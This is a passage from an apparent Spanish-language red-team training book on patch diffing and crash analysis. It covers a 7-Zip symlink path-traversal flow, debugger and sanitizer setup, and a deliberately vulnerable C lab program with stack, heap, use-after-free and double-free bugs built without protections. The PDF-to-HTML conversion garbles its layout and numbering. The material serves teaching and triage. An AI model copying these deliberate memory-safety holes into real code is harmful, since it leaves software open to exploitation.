<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capítulo 05: Análisis de Crashes | Bitácora Red Team</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
    <style>
        :root {
            --primary-color: #0D47A1;
            --secondary-color: #E3F2FD;
            --accent-color: #42A5F5;
            --text-color: #1A237E;
            --bg-color: #FFFFFF;
            --glass-bg: rgba(255, 255, 255, 0.75);
            --glass-border: rgba(255, 255, 255, 0.3);
            --sidebar-width: 300px;
            --sidebar-collapsed: 60px;
        }
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Lato', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: var(--text-color);
            line-height: 1.8;
            min-height: 100vh;
        }
        
        .layout {
            display: flex;
            min-height: 100vh;
        }
        
        .sidebar {
            width: var(--sidebar-width);
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-right: 1px solid var(--glass-border);
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            transition: transform 0.3s ease;
            z-index: 100;
        }
        
        .sidebar-header {
            padding: 25px 20px;
            background: linear-gradient(135deg, #0a1628 0%, #0D47A1 50%, #1565C0 100%);
            color: white;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .sidebar-header h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.1rem;
            margin: 0 0 5px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .sidebar-header .subtitle {
            font-size: 0.7rem;
            opacity: 0.85;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        
        .nav-section {
            padding: 5px 0;
        }
        
        .nav-section-title {
            padding: 12px 20px 8px;
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: var(--accent-color);
            font-weight: 700;
            background: rgba(66, 165, 245, 0.08);
        }
        
        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 20px;
            color: var(--text-color);
            text-decoration: none;
            font-size: 0.9rem;
            transition: all 0.2s ease;
            border-left: 3px solid transparent;
        }
        
        .nav-item:hover {
            background: var(--secondary-color);
            border-left-color: var(--accent-color);
        }
        
        .nav-item.active {
            background: var(--secondary-color);
            border-left-color: var(--primary-color);
            font-weight: 700;
            color: var(--primary-color);
        }
        
        .nav-item i {
            width: 18px;
            color: var(--accent-color);
            text-align: center;
            font-size: 0.85rem;
        }
        
        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 40px 50px;
            max-width: calc(100vw - var(--sidebar-width));
        }
        
        .sidebar-toggle {
            position: fixed;
            top: 15px;
            left: 15px;
            z-index: 200;
            background: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 10px;
            cursor: pointer;
            display: none;
            box-shadow: 0 4px 15px rgba(13, 71, 161, 0.3);
        }
        
        .content-header {
            margin-bottom: 35px;
            padding-bottom: 20px;
            border-bottom: 2px solid var(--accent-color);
        }
        
        .content-header h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 2.2rem;
            color: var(--primary-color);
            margin-bottom: 8px;
        }
        
        .breadcrumb {
            font-size: 0.85rem;
            color: #666;
        }
        
        .breadcrumb a {
            color: var(--accent-color);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .section {
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(10px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
        }
        
        .section h2 {
            font-family: 'Montserrat', sans-serif;
            color: var(--primary-color);
            margin: 30px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--accent-color);
            font-size: 1.4rem;
        }
        
        .section h2:first-child {
            margin-top: 0;
        }
        
        .section h3 {
            color: var(--text-color);
            margin: 25px 0 15px;
            font-size: 1.15rem;
            font-weight: 600;
        }
        
        .section h4 {
            color: #333;
            margin: 20px 0 12px;
            font-size: 1rem;
        }
        
        .section p {
            margin-bottom: 15px;
            text-align: justify;
        }
        
        .section ul, .section ol {
            margin: 15px 0 15px 25px;
        }
        
        .section li {
            margin-bottom: 8px;
        }
        
        .section pre {
            background: #1e1e1e;
            border-radius: 12px;
            padding: 20px;
            overflow-x: auto;
            margin: 20px 0;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.3);
        }
        
        .section code {
            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.9em;
        }
        
        .section :not(pre) > code {
            background: var(--secondary-color);
            padding: 3px 8px;
            border-radius: 5px;
            color: var(--primary-color);
            font-size: 0.9em;
        }
        
        .section table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .section th, .section td {
            padding: 14px 18px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        .section th {
            background: var(--secondary-color);
            font-weight: 700;
            color: var(--primary-color);
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 0.5px;
        }
        
        .section tr:hover {
            background: rgba(66, 165, 245, 0.05);
        }
        
        .vuln-card {
            background: linear-gradient(135deg, rgba(13, 71, 161, 0.06) 0%, rgba(66, 165, 245, 0.1) 100%);
            border-left: 4px solid var(--accent-color);
            padding: 20px;
            margin: 20px 0;
            border-radius: 0 12px 12px 0;
        }
        
        .vuln-card.danger {
            border-left-color: #f44336;
            background: linear-gradient(135deg, rgba(244, 67, 54, 0.06) 0%, rgba(244, 67, 54, 0.1) 100%);
        }
        
        .vuln-card.warning {
            border-left-color: #ff9800;
            background: linear-gradient(135deg, rgba(255, 152, 0, 0.06) 0%, rgba(255, 152, 0, 0.1) 100%);
        }
        
        .vuln-card.success {
            border-left-color: #4caf50;
            background: linear-gradient(135deg, rgba(76, 175, 80, 0.06) 0%, rgba(76, 175, 80, 0.1) 100%);
        }
        
        .toc {
            background: var(--secondary-color);
            border-radius: 12px;
            padding: 20px 25px;
            margin-bottom: 30px;
        }
        
        .toc h3 {
            margin: 0 0 15px;
            color: var(--primary-color);
            font-size: 1rem;
            font-weight: 600;
        }
        
        .toc ul {
            list-style: none;
            margin: 0;
            padding: 0;
        }
        
        .toc li {
            margin: 8px 0;
        }
        
        .toc a {
            color: var(--text-color);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.2s;
        }
        
        .toc a:hover {
            color: var(--accent-color);
        }
        
        .page-nav {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
            padding-top: 25px;
            border-top: 1px solid #ddd;
        }
        
        .page-nav a {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 14px 24px;
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            text-decoration: none;
            color: var(--text-color);
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .page-nav a:hover {
            background: var(--primary-color);
            color: white;
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(13, 71, 161, 0.3);
        }
        
        .page-nav a.disabled {
            opacity: 0.5;
            pointer-events: none;
        }
        
        @media (max-width: 900px) {
            .sidebar-toggle {
                display: block;
            }
            
            .sidebar {
                transform: translateX(-100%);
            }
            
            .sidebar.open {
                transform: translateX(0);
            }
            
            .main-content {
                margin-left: 0;
                padding: 70px 20px 30px;
            }
        }
        
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0,0,0,0.05);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent-color);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-color);
        }
        
        .license-notice {
            font-size: 0.75rem;
            color: #666;
            padding: 15px 20px;
            border-top: 1px solid rgba(0,0,0,0.05);
            margin-top: auto;
        }
    </style>
</head>
<body>
    <button class="sidebar-toggle" onclick="toggleSidebar()">
        <i class="fas fa-bars"></i>
    </button>
    
    <div class="layout">
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <h1><i class="fas fa-shield-alt"></i> Bitácora</h1>
                <div class="subtitle">Red Team</div>
            </div>
            
            <nav>
                
            <a href="01-introduccion.html" class="nav-item">
                <i class="fas fa-book"></i>Introducción
            </a>
            <a href="02-clases-vulnerabilidades.html" class="nav-item">
                <i class="fas fa-bug"></i>Clases de Vulnerabilidades
            </a>
            <a href="03-fuzzing.html" class="nav-item">
                <i class="fas fa-flask"></i>Fuzzing
            </a>
            <a href="04-patch-diffing.html" class="nav-item">
                <i class="fas fa-code-branch"></i>Patch Diffing
            </a>
            <a href="05-analisis-crashes.html" class="nav-item">
                <i class="fas fa-exclamation-triangle"></i>Análisis de Crashes
            </a>
            </nav>
            
            <div class="license-notice">
                <i class="fas fa-creative-commons"></i> CC BY-NC 4.0
            </div>
        </aside>
        
        <main class="main-content">
            <div class="content-header animate__animated animate__fadeInDown">
                <div class="breadcrumb"><a href="/">Bitácora Red Team</a> / Capítulo 05: Análisis de Crashes</div>
                <h1>Capítulo 05: Análisis de Crashes</h1>
            </div>
            
            <div class="animate__animated animate__fadeInUp">
                <div class="section"><h3 id="capitulo-4-patch-diffing">CAPÍTULO 4. PATCH DIFFING</h3>
<p>Bitácora Red Team
│
PERO symlink WSL espera '/' como absoluto
│
│
4. Path clasificado como "relativo" - check bypassed
│
│
5. Symlink creado: safe_folder\link -&gt; C:\Users\Public\Desktop │
│
6. Extracción: safe_folder\link\malware.exe
│
│
7. Windows sigue symlink →escribe a C:\Users\Public\Desktop\
│
└─────────────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────────────┐
│
RESULTADO: Arbitrary File Write fuera del directorio!
│
│
→RCE via DLL hijacking, startup folder, file association
│
└─────────────────────────────────────────────────────────────────┘</p>
<h3 id="474">4.7.4.</h3>
<h3 id="374-checklist-de-triage-para-codigo-de-validacion-de-paths">3.7.4 Checklist de Triage para Código de Validación de Paths</h3>
<p>Buscar: ‐ Funciones: IsSafePath, ValidatePath, CheckPath, Normalize ‐ Detección de absoluto:
IsAbsolute, IsRelative, GetRootPrefixSize ‐ Concatenación de paths: JoinPath, CombinePath, ope-
rator/ ‐ Manejo de symlinks: CreateSymbolicLink, SetReparseData ‐ Conversión de separadores:
Replace('/', '\')
Verificar: ‐ ¿Detección de path absoluto funciona cross‐plataforma? ‐ ¿Symlinks WSL/Linux mane‐
jados con semántica correcta? ‐ ¿Normalización ocurre ANTES de validación? ‐ ¿Checks de “dange‐
rous link” corren para TODOS los tipos de symlink? ‐ ¿No hay guards #ifdef que salten verificaciones
de seguridad?</p>
<h3 id="475">4.7.5.</h3>
<p>Conclusiones del Capítulo 3
1. El parche es frecuentemente la única fuente de verdad cuando los detalles del CVE son
limitados.
2. Las herramientas automatizan pero no reemplazan el análisis humano ‐ Ghidriff encuen‐
tra funciones cambiadas, tú entiendes por qué.
3. Los símbolos son multiplicadores de fuerza ‐ Con PDBs ves IppValidatePacketLength; sin
ellos, ves sub_1400A2F40.
4. Patrones de corrección revelan clases de vulnerabilidad:
Bounds checks añadidos →overflow/OOB
Inicialización añadida →memoria no inicializada
Locks añadidos →race condition
Validación de input →input validation flaw
5. El patch diffing encuentra variantes ‐ Al analizar un fix, frecuentemente se descubren bugs
similares en código cercano.
6. El análisis cross‐plataforma requiere conocimiento de ambas semánticas ‐ Como se vio
en 7‐Zip, paths WSL en Windows necesitan tratamiento especial.</p>
<hr />
<h3 id="capitulo-4-patch-diffing_1">CAPÍTULO 4. PATCH DIFFING</h3>
<p>Bitácora Red Team
7. La automatización transforma el análisis de reactivo a proactivo ‐ Puedes analizar parches
horas después de su liberación.
Preguntas de Discusión:
1. CVE‐2022‐34718 requiere IPsec SA establecida pero recibió CVSS 9.8. ¿Cómo deberían los
prerrequisitos afectar el rating de severidad?
2. El bug de EvilESP abarcó dos funciones ﴾IppReceiveEsp y Ipv6pReassembleDatagram﴿. ¿Cómo
podrían el análisis estático o revisión de código detectar vulnerabilidades cross‐función?
3. La fragmentación IPv6 es fuente recurrente de vulnerabilidades. ¿Qué hace que la lógica de
reensamblaje sea propensa a errores?
4. El fix de 7‐Zip añadió 6+ cambios distintos. ¿Cómo determinas cuál corrige la vulnerabilidad
core vs añade defensa en profundidad?</p>
<hr />
<p>Capítulo 5
Análisis de Crashes
Después de encontrar vulnerabilidades potenciales mediante fuzzing o patch diffing, el siguiente
paso crítico es analizar crashes para determinar si son explotables. Este capítulo cubre triage de
crashes, dominio de depuradores, sanitizers de memoria y técnicas avanzadas de análisis de causa
raíz.
Objetivos del Capítulo: ‐ Configurar entornos de depuración profesionales ﴾WinDbg, Pwndbg﴿‐
Dominar sanitizers de memoria ﴾ASAN, UBSAN, MSAN, TSAN﴿‐ Implementar pipelines automatiza‐
dos de triage con CASR ‐ Desarrollar PoCs confiables con pwntools ‐ Construir cadenas de explota‐
ción completas</p>
<h3 id="51">5.1.</h3>
<h3 id="41-fundamentos-del-analisis-de-crashes">4.1 Fundamentos del Análisis de Crashes</h3>
<p>El análisis de crashes es el proceso de transformar un crash descubierto por un fuzzer en conocimien‐
to accionable sobre una vulnerabilidad. Esto incluye determinar la causa raíz, evaluar explotabilidad,
y desarrollar pruebas de concepto.</p>
<h3 id="511">5.1.1.</h3>
<h3 id="411-arbol-de-decision-para-analisis-de-crashes">4.1.1 Árbol de Decisión para Análisis de Crashes</h3>
<p>┌─────────────────────────────────────────────────────────────────────────┐
│</p>
<h3 id="crash-recibido">CRASH RECIBIDO</h3>
<p>│
│
(fuzzer, reporte de bug, test)
│
└─────────────────────────────────────────────────────────────────────────┘
│
▼
┌───────────────────────┐
│¿Reproducible?
│──No──►Análisis de condiciones
└───────────────────────┘
de race / no-determinismo
│Sí
│
▼
▼
┌───────────────────────────────┐
┌────────────────┐
│¿Código fuente disponible?
│
│rr / TTD para
│</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
└───────────────────────────────┘
│replay exacto
│
│
│
└────────────────┘
Sí
No
│
│
▼
▼
┌───────────────────────────────┐
┌──────────────────────────────────┐
│Recompilar con sanitizers:
│
│¿Qué plataforma?
│
│• -fsanitize=address,undefined│
└──────────────────────────────────┘
│• -g -O1
│
│
│
│
│• -fno-omit-frame-pointer
│
Windows
Linux
Mobile
└───────────────────────────────┘
│
│
│
│
▼
▼
▼
▼
┌─────────┐┌──────────┐┌───────────┐
┌───────────────────────────┐
│WinDbg
││Pwndbg
││Tombstone │
│Ejecutar con crash input
│</p>
<h3 id="ttd">│+ TTD</h3>
<p>││+ rr
││+ Frida
│
│Capturar reporte ASAN
│
│+ !exp</p>
<h3 id="casr">││+ CASR</h3>
<h3 id="lldb">││+ LLDB</h3>
<p>│
└───────────────────────────┘
└─────────┘└──────────┘└───────────┘
│
│
│
│
└──────────────────┴───────────┴────────────┘
│
▼
┌───────────────────────────────────────────┐
│</p>
<h3 id="clasificacion-triage">CLASIFICACIÓN &amp; TRIAGE</h3>
<p>│
│• Tipo de crash (OOB, UAF, DoubleFree)
│
│• Nivel de control del atacante
│
│• Severidad (Exploitable/Maybe/No)
│
└───────────────────────────────────────────┘
│
▼
┌───────────────────────────────────────────┐
│</p>
<h3 id="analisis-de-causa-raiz">ANÁLISIS DE CAUSA RAÍZ</h3>
<p>│
│• Minimizar input (afl-tmin)
│
│• Trazar ejecución (DynamoRIO, Intel PT)
│
│• Buscar datos controlados por atacante
│
└───────────────────────────────────────────┘
│
▼
┌───────────────────────────────────────────┐
│
DESARROLLO DE PoC
│
│• Script reproducible (Python/pwntools)
│
│• Test de confiabilidad (10/10 crashes)
│
│• Documentación de impacto
│
└───────────────────────────────────────────┘</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_1">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="512">5.1.2.</h3>
<h3 id="412-seleccion-de-herramientas-por-escenario">4.1.2 Selección de Herramientas por Escenario</h3>
<p>Escenario
Herramienta Principal
Secundaria
Sanitizer
Flujo
Linux + fuente
GDB + Pwndbg
rr</p>
<h3 id="asan">ASAN +</h3>
<h3 id="ubsan">UBSAN</h3>
<p>Recompilar
→Repro‐
ducir →
Analizar
Linux sin
fuente
GDB + Pwndbg
Ghidra</p>
<h3 id="na">N/A</h3>
<p>Reversing
→Crash
→Triage
Windows +
fuente
WinDbg + TTD
Visual Studio</p>
<h3 id="asan-msvc">ASAN ﴾MSVC﴿</h3>
<p>Símbolos</p>
<h3 id="ttd_1">→TTD →</h3>
<p>Análisis
Windows sin
fuente
WinDbg + TTD
IDA/Ghidra</p>
<h3 id="na_1">N/A</h3>
<p>PageHeap
→!exploi‐
table
Corpus de
fuzzer</p>
<h3 id="casr_1">CASR</h3>
<p>afl‐tmin</p>
<h3 id="asan_1">ASAN</h3>
<p>Cluster →
Minimi‐
zar →
Priorizar
Crash no
determinístico
rr / TTD
GDB/WinDbg</p>
<h3 id="tsan">TSAN</h3>
<p>Grabar →
Replay →
Bisect
Kernel Linux
crash + GDB
drgn</p>
<h3 id="kasan">KASAN</h3>
<p>vmcore
→
Símbolos
→
Análisis
Kernel
Windows
WinDbg kernel
Driver Verifier</p>
<h3 id="na_2">N/A</h3>
<p>.dmp →
Símbolos
→
!analyze
Rust/Go
rust‐gdb / Delve</p>
<h3 id="lldb_1">LLDB</h3>
<p>ASAN ﴾nightly﴿
Panic →
Backtrace</p>
<h3 id="ffi">→FFI</h3>
<h3 id="513">5.1.3.</h3>
<h3 id="413-suite-de-pruebas-vulnerable">4.1.3 Suite de Pruebas Vulnerable</h3>
<p>Para los ejercicios de este capítulo, usaremos un binario con múltiples vulnerabilidades:
// ~/crash_analysis_lab/src/vulnerable_suite.c
// Compila con: gcc -g -fno-stack-protector vulnerable_suite.c -o ../vuln_no_protect
// Para ASAN: gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite.c -o ../vuln_as</p>
<h1 id="include">include <stdio.h></h1>
<h1 id="include_1">include <stdlib.h></h1>
<h1 id="include_2">include <string.h></h1>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_2">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
// Test 1: Stack Buffer Overflow
// Control de RIP a offset 72 bytes (64 buffer + 8 RBP guardado)
void stack_overflow(char <em>input) {
char buffer[64];
printf("[</em>] Copiando input a buffer de 64 bytes...\n");
strcpy(buffer, input);
// ¡Sin verificación de límites!
printf("[<em>] Buffer:
%s\n", buffer);
}
// Test 2: Heap Buffer Overflow
// Corrupción de metadatos del heap
void heap_overflow(char </em>input) {
char <em>buf = malloc(32);
printf("[</em>] Allocated 32 bytes at
%p\n", buf);
strcpy(buf, input);
// Overflow del buffer de heap
printf("[<em>] Buffer:
%s\n", buf);
free(buf);
}
// Test 3: Use-After-Free
// Lectura y escritura después de free()
void use_after_free(void) {
char </em>ptr = malloc(64);
strcpy(ptr, "Hello, World!");
printf("[<em>] Allocated at
%p:
%s\n", ptr, ptr);
free(ptr);
// Liberar memoria
printf("[</em>] Freed, now accessing...\n");
printf("[<em>] UAF read:
%s\n", ptr);
// Lectura UAF
ptr[0] = 'X';
// Escritura UAF
}
// Test 4: Double Free
// Corrupción de estructuras del allocator
void double_free(void) {
char </em>ptr = malloc(64);
printf("[<em>] Allocated at
%p\n", ptr);
free(ptr);
printf("[</em>] First free done\n");
free(ptr);
// ¡Double free!
}
// Test 5: NULL Pointer Dereference
// Crash determinístico en NULL
void null_deref(int trigger) {
char <em>ptr = trigger ? malloc(10) : NULL;
printf("[</em>] ptr =
%p\n", ptr);
*ptr = 'A';
// NULL deref si trigger es 0</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_3">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
}
void print_usage(char *prog) {
printf("Usage:
%s <test_num> [input]\n", prog);
printf("Tests:\n");
printf("
1 <input>
- Stack overflow (72 bytes a RIP)\n");
printf("
2 <input>
- Heap overflow\n");
printf("</p>
<ul>
<li>
<p>Use-after-free\n");
printf("</p>
</li>
<li>
<p>Double free\n");
printf("
5 &lt;0|1&gt;</p>
</li>
<li>NULL deref (0=crash)\n");
}
int main(int argc, char **argv) {
setbuf(stdout, NULL);
setbuf(stderr, NULL);
if (argc &lt; 2) { print_usage(argv[0]); return 1; }
int test = atoi(argv[1]);
switch(test) {
case 1: if (argc&lt;3) return 1; stack_overflow(argv[2]); break;
case 2: if (argc&lt;3) return 1; heap_overflow(argv[2]); break;
case 3: use_after_free(); break;
case 4: double_free(); break;
case 5: if (argc&lt;3) return 1; null_deref(atoi(argv[2])); break;
default: print_usage(argv[0]); return 1;
}
return 0;
}
Compilación del Laboratorio:
mkdir -p ~/crash_analysis_lab/{src,crashes,casrep,pocs}
cd ~/crash_analysis_lab/src</li>
</ul>
<h1 id="guardar-vulnerable_suitec-y-compilar-variantes">Guardar vulnerable_suite.c y compilar variantes</h1>
<h1 id="1-sin-protecciones-para-explotacion">1. Sin protecciones (para explotación)</h1>
<p>gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite.c -o ../vuln_no_protect</p>
<h1 id="2-con-asan-para-deteccion-de-bugs">2. Con ASAN (para detección de bugs)</h1>
<p>gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite.c -o ../vuln_asan</p>
<h1 id="3-con-protecciones-estandar-para-comparacion">3. Con protecciones estándar (para comparación)</h1>
<p>gcc -g vulnerable_suite.c -o ../vuln_protected</p>
<h1 id="verificar-compilaciones">Verificar compilaciones</h1>
<p>ls -la ~/crash_analysis_lab/vuln_*</p>
<h1 id="test-rapido">Test rápido</h1>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_4">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
cd ~/crash_analysis_lab
./vuln_no_protect 1 $(python3 -c "print('A'*100)")</p>
<h1 id="stack-overflow">Stack overflow</h1>
<p>./vuln_asan 3</p>
<h1 id="uaf-detectado-por-asan">UAF detectado por ASAN</h1>
<p>Tabla de Comportamiento de Crashes:
Test
Sin ASAN
Con ASAN
Señal
Notas
1 ﴾Stack﴿</p>
<h3 id="sigsegv">SIGSEGV</h3>
<h2 id="asan_2">ASAN:</h2>
<p>stack‐buffer‐overflow
SIGSEGV/SIGABRTControl de RIP
2 ﴾Heap﴿
Silencioso</p>
<h2 id="asan_3">ASAN:</h2>
<p>heap‐buffer‐overflow</p>
<h3 id="sigabrt">SIGABRT</h3>
<p>Sin ASAN no
crashea</p>
<h3 id="3-uaf">3 ﴾UAF﴿</h3>
<p>Silencioso</p>
<h2 id="asan_4">ASAN:</h2>
<p>heap‐use‐after‐free</p>
<h3 id="sigabrt_1">SIGABRT</h3>
<p>Sin ASAN no
crashea
4 ﴾Double﴿</p>
<h3 id="sigabrt_2">SIGABRT</h3>
<p>ASAN: double‐free</p>
<h3 id="sigabrt_3">SIGABRT</h3>
<p>Detectado por
glibc</p>
<h3 id="5-null">5 ﴾NULL﴿</h3>
<h3 id="sigsegv_1">SIGSEGV</h3>
<p>ASAN: SEGV on
unknown</p>
<h3 id="sigsegv_2">SIGSEGV</h3>
<p>Crash
inmediato
￿ IMPORTANTE: Los tests 2 y 3 ﴾heap overflow y UAF﴿son silenciosos sin ASAN. Siem‐
pre usar builds con sanitizers para triage completo.</p>
<h3 id="52">5.2.</h3>
<h3 id="42-depuradores-y-configuracion">4.2 Depuradores y Configuración</h3>
<h3 id="521">5.2.1.</h3>
<h3 id="421-windbg-preview-para-windows">4.2.1 WinDbg Preview para Windows</h3>
<p>WinDbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades
avanzadas de Time Travel Debugging.
Instalación y Configuración:</p>
<h1 id="instalar-desde-microsoft-store-o-winget">Instalar desde Microsoft Store o winget</h1>
<p>winget install Microsoft.WinDbgPreview</p>
<h1 id="crear-directorio-de-simbolos">Crear directorio de símbolos</h1>
<p>mkdir C:\Symbols</p>
<h1 id="configurar-symbol-path-persistente-variable-de-entorno">Configurar symbol path persistente (variable de entorno)</h1>
<h3 id="nt_symbol_path">"NT_SYMBOL_PATH",</h3>
<p>"SRV<em>C:\Symbols</em>https://msdl.microsoft.com/download/symbols",
"User"
)
Configuración de Symbol Path en WinDbg:
.sympath SRV<em>C:\Symbols</em>https://msdl.microsoft.com/download/symbols
.symfix+ C:\Symbols
.reload /f</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_5">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Comandos Esenciales de WinDbg:
Comando
Propósito
Ejemplo
!analyze -v
Análisis automático de crash</p>
<h3 id="na_3">N/A</h3>
<p>k / kp / kv
Stack trace ﴾varios formatos﴿
kv 20
r
Mostrar registros
r rax, rbx
u / ub
Disassembly adelante/atrás
u rip L10
d / db / dq
Dump de memoria
dq rsp L8
!heap
Análisis del heap
!heap -s
!address
Información de región de memoria
!address rsp
lm
Listar módulos cargados
lm vm ntdll
!peb
Process Environment Block</p>
<h3 id="na_4">N/A</h3>
<p>.ecxr
Cambiar a contexto de excepción</p>
<h3 id="na_5">N/A</h3>
<p>g
Continuar ejecución</p>
<h3 id="na_6">N/A</h3>
<p>p / t
Step over / Step into</p>
<h3 id="na_7">N/A</h3>
<p>Time Travel Debugging ﴾TTD﴿:
TTD permite grabar la ejecución completa de un proceso y reproducirla hacia adelante o atrás.</p>
<h1 id="grabar-ejecucion-con-ttd-desde-linea-de-comandos">Grabar ejecución con TTD desde línea de comandos</h1>
<p>tttracer.exe -out C:\Traces -launch target.exe crash_input.txt</p>
<h1 id="o-desde-windbg-preview">O desde WinDbg Preview:</h1>
<h1 id="file-start-debugging-launch-executable-advanced-record-with-time-travel">File →Start debugging →Launch executable (advanced) →✓Record with Time Travel</h1>
<p>Comandos TTD en WinDbg:
Comando
Propósito
!tt 0
Ir al inicio del trace
!tt 100
Ir al final del trace
!tt 50
Ir al 50 % del trace
g-
Ejecutar hacia atrás
p-
Step back
!positions
Mostrar posiciones del trace
!index
Construir índice para búsquedas
dx @$curses-
sion.TTD.Calls("ntdll!<em>Heap</em>")
Buscar llamadas a funciones
dx @$cursession.TTD.Memory(address,
size, "w")
Buscar escrituras a memoria
Script de Clasificación Automatizada ﴾WinDbg JavaScript﴿:
// crash_classify.js - Ejecutar con: .scriptrun crash_classify.js
"use strict";
function initializeScript() {</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_6">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
return [new host.apiVersionSupport(1, 7)];
}
function analyzeCurrentCrash() {
const ctl = host.namespace.Debugger.Utility.Control;
const dbg = host.namespace.Debugger.State;
// Obtener contexto de excepción
ctl.ExecuteCommand(".ecxr");
// Obtener registros
const regs = dbg.DebuggerVariables.curthread.Registers.User;
const rip = regs.rip;
const rsp = regs.rsp;
host.diagnostics.debugLog("=== Crash Classification ===\n");
host.diagnostics.debugLog(<code>RIP: ${rip}\n</code>);
host.diagnostics.debugLog(<code>RSP: ${rsp}\n</code>);
// Clasificar por tipo de acceso
let crashType = "UNKNOWN";
let severity = "UNKNOWN";
// Verificar si RIP es controlable
if (rip &lt; 0x10000 || rip &gt; 0x7fffffffffff) {
crashType = "RIP_CONTROL";
severity = "CRITICAL";
}
// Verificar NULL deref
else if (rip &lt; 0x1000) {
crashType = "NULL_DEREF";
severity = "LOW";
}
host.diagnostics.debugLog(<code>Type: ${crashType}\n</code>);
host.diagnostics.debugLog(<code>Severity: ${severity}\n</code>);
// Análisis de !exploitable si está disponible
try {
ctl.ExecuteCommand("!exploitable");
} catch(e) {
host.diagnostics.debugLog("(!exploitable no disponible)\n");
}
return { crashType, severity, rip: rip.toString(16) };
}
function invokeScript() {</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_7">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
return analyzeCurrentCrash();
}</p>
<h3 id="522">5.2.2.</h3>
<h3 id="422-gdb-pwndbg-para-linux">4.2.2 GDB + Pwndbg para Linux</h3>
<p>Pwndbg es una extensión de GDB diseñada específicamente para análisis de vulnerabilidades y
desarrollo de exploits.
Instalación de Pwndbg:</p>
<h1 id="clonar-e-instalar">Clonar e instalar</h1>
<p>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</p>
<h1 id="verificar-instalacion">Verificar instalación</h1>
<p>gdb -q -ex "quit"</p>
<h1 id="deberia-mostrar-banner-de-pwndbg">Debería mostrar banner de Pwndbg</h1>
<h1 id="dependencias-adicionales-recomendadas">Dependencias adicionales recomendadas</h1>
<p>pip install pwntools ropper capstone keystone-engine
Configuración de Core Dumps en Linux:</p>
<h1 id="habilitar-core-dumps-ilimitados">Habilitar core dumps ilimitados</h1>
<p>ulimit -c unlimited</p>
<h1 id="configurar-patron-de-nombre-de-cores">Configurar patrón de nombre de cores</h1>
<p>echo "core. %e. %p. %t" | sudo tee /proc/sys/kernel/core_pattern</p>
